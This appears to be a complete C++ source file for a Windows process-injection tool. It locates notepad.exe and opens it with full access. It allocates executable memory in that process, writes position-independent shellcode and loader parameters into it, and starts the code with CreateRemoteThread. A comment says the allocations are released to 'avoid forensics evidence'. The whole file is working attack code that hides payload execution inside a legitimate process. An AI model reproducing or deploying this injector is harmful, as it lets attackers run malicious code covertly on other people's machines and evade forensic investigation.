#include "../PIC/PIC.h"
#include "../Common/ProcessUtils.h"
#include "../Common/AutoHandle.h"
#include "../Common/Win32ErrorCodeException.h"
#include "../Common/VirtualAllocExGuard.h"
#include "../Common/StringUtils.h"
#include "../Common/DebugPrint.h"

#include <exception>
#include <stdexcept>
#include <string>
#include <iostream>
#include <iomanip>

#include <Windows.h>


void writeToTargetProcess(HANDLE targetProcess, LPVOID remoteAddress, LPVOID data, SIZE_T dataSize);
PicParams getPicParameters(SIZE_T picSize);

const std::wstring targetProcessName(L"notepad.exe");

int wmain(int argc, PWCHAR argv[])
{
	try
	{
		const std::uint32_t targetPid = ProcessUtils::getProcessPidByProcessName(targetProcessName);
		DEBUG_PRINT("[+] Found target process PID=" + StringUtils::hexValue(targetPid));


		const AutoHandle targetProcess(OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid));
		if (nullptr == targetProcess.get())
		{
			throw Win32ErrorCodeException("Could not open handle to target process");
		}

		DEBUG_PRINT("[+] Open handle to target process");


		VirtualAllocExGuard remoteParamsMemoryGuard(targetProcess.get(), sizeof(PicParams), PAGE_EXECUTE_READWRITE);
		DEBUG_PRINT("[+] Allocate memory for PIC parameters in target process");


		const int picBytesSize = reinterpret_cast<LPBYTE>(endPic) - reinterpret_cast<LPBYTE>(startPic);
		if (0 >= picBytesSize)
		{
			throw std::runtime_error("Invalid PIC size");
		}


		PicParams params = getPicParameters(picBytesSize);


		writeToTargetProcess(targetProcess.get(), remoteParamsMemoryGuard.get(), &params, sizeof(PicParams));
		DEBUG_PRINT("[+] Write PIC parameters to target process at address: "
			+ StringUtils::hexValue(reinterpret_cast<std::uint64_t>(remoteParamsMemoryGuard.get())));


		VirtualAllocExGuard remotePicMemoryGuard(targetProcess.get(), picBytesSize, PAGE_EXECUTE_READWRITE);
		DEBUG_PRINT("[+] Allocate memory for PIC in target process");


		writeToTargetProcess(targetProcess.get(), remotePicMemoryGuard.get(), &startPic, picBytesSize);
		DEBUG_PRINT("[+] Write PIC to target process at address: "
			+ StringUtils::hexValue(reinterpret_cast<std::uint64_t>(remotePicMemoryGuard.get())));


		DWORD threadId;
		const AutoHandle targetThread(CreateRemoteThread(targetProcess.get(), nullptr, 0,
			static_cast<LPTHREAD_START_ROUTINE>(remotePicMemoryGuard.get()), remoteParamsMemoryGuard.get(), 0, &threadId));
		if (nullptr == targetThread.get())
		{
			throw Win32ErrorCodeException("Could not create remote thread in target process");
		}

		DEBUG_PRINT("[+] Create remote thread in target process TID=" + StringUtils::hexValue(threadId));


		WaitForSingleObject(targetThread.get(), INFINITE);

		/*
		 * VirtualAllocExGuard get called automatically in order to release
		 * shellcode memory and avoid forensics evidence.
		 * If you want to keep the remote allocation after the injection add:
			remoteParamsMemoryGuard.release();
			remotePicMemoryGuard.release();
		* so we don't want to destroy the memory.
		*/
	}
	catch (std::exception& exception)
	{
		std::cout << exception.what() << std::endl;
		return 1;
	}

	return 0;
}

void writeToTargetProcess(HANDLE targetProcess, LPVOID remoteAddress, LPVOID data, SIZE_T dataSize)
{
	SIZE_T bytesWritten;
	if (!WriteProcessMemory(targetProcess, remoteAddress, data, dataSize, &bytesWritten))
	{
		throw Win32ErrorCodeException("Could not write PIC parameters to target process memory");
	}
}

PicParams getPicParameters(SIZE_T picSize)
{
	PicParams params{ nullptr, nullptr };

	params.loadLibraryA = LoadLibraryA;
	params.getProcAddress = GetProcAddress;

	if (nullptr == params.getProcAddress || nullptr == params.loadLibraryA)
	{
		throw std::runtime_error("Invalid PIC parameters");
	}

	params.picSize = picSize;

	return params;
}